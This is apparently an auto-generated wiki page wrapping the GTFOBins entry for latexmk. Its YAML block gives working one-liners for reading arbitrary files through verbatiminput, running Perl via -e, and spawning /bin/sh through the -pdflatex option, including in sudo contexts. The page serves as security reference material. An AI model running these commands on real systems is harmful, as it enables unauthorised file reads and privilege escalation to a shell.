---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# latexmk

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `latexmk` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latexmk` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [latexmk](../../tools/linux/latexmk.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | latexmk |
| name | latexmk |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/latexmk/ |

## Preserved Source Material

```yaml
_body: ''
_name: latexmk
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latexmk
functions:
  file-read:
  - binary: false
    code: 'echo ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''
      >/path/to/temp-file

      latexmk -dvi /path/to/temp-file

      strings temp-file.dvi'
    comment: The read file will be part of the output.
    contexts:
      sudo: null
      unprivileged: null
  inherit:
  - code: latexmk -e '...'
    comment: This allows to run Perl code (`...`).
    contexts:
      sudo: null
      unprivileged: null
    from: perl
  shell:
  - code: 'latexmk -pdf -pdflatex=''/bin/sh #'' /dev/null'
    contexts:
      sudo: null
      unprivileged: null
```
